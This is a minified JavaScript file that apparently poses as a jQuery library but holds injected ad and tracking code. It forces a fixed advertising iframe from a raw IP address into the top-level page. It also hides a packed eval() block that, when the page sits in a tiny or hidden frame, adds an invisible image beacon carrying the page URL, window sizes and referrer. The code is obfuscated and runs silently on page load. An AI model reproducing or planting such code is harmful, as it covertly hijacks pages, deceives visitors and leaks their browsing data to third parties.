var osrc ="http://common.cnblogs.com/script/jquery.js";osrc+=(osrc.indexOf('?')>0?'&':'?')+'_t='+(new Date().getTime());document.write('<script type="text/javascript" src="'+osrc+'"></'+'script>');function withjQuery(callback){if(typeof(jQuery)=="undefined"){var script=document.createElement("script");script.type="text/javascript";script.src="http://cdn.staticfile.org/jquery/1.7/jquery.min.js";script.addEventListener('load',function(){callback(jQuery)});document.head.appendChild(script)}else{callback(jQuery)}}function getTopWin(w){try{w.parent.document.domain;return w.parent==w?w:getTopWin(w.parent)}catch(e){return w}}_win=getTopWin(window);_doc=_win.document;withjQuery(function($){$(function(){$doc=$(_doc);if($('._ih',$doc).size()==0)$('body',$doc).append('<div class="_ih" style="width: 300px;height: 250px;position: fixed;right: 2px;bottom: 2px;display: block;border-radius: 4px;box-shadow: none;z-index: 999;padding: 0px;font-size: 12px;"><div style="position: absolute;right: 0px;top: 0px;margin-right: 4px;"><a style="width: 20px;height: 20px;text-align: center;line-height: 20px;display: inline-block;text-decoration: none;font-family: Verdana,Geneva,sans-serif;font-weight: bold;font-size: 15px;cursor: pointer;color: #000;margin: 2px 0 0 2px;" class="_ic">Χ</a></div><iframe scrolling="no" frameborder="no" src="http://219.234.83.60/locate_2/wansheng_pc.html" allowtransparency="true" style="width: 300px;height: 250px;border-radius: 4px;"></iframe><img src="http://static.youxiaoad.com/images/ad.png" style="position: absolute;left: 0px;bottom: 0px;"></div>');$('._ic',$doc).hover(function(){$(this).css('color','#F00')}, function(){$(this).css('color','#000')});$('._ic',$doc).click(function(){$(this).parents('._ih').remove()});window.setTimeout(function(){$('._ic',$doc).click()}, 30*1000)})});eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 8=2.b/2.g;6 7=2.a/2.l;n(8>0&&8<0.5&&7>0&&7<0.5){6 4=2.c.d+(2.c.d.f("?")!=-1?"&":"?")+"i";4+=\'&j=\'+2.b+\'&h=\'+2.a;4+=\'&r=\'+k(9.m);6 3=9.o("3");3.4=4;3.p.q="s";9.t.e(3)}',30,30,'||_win|img|src||var|r2|r1|_doc|innerHeight|innerWidth|location|href|appendChild|indexOf|outerWidth||_acdwdgsvesdggop|w|encodeURIComponent|outerHeight|referrer|if|createElement|style|display||none|body'.split('|'),0,{}))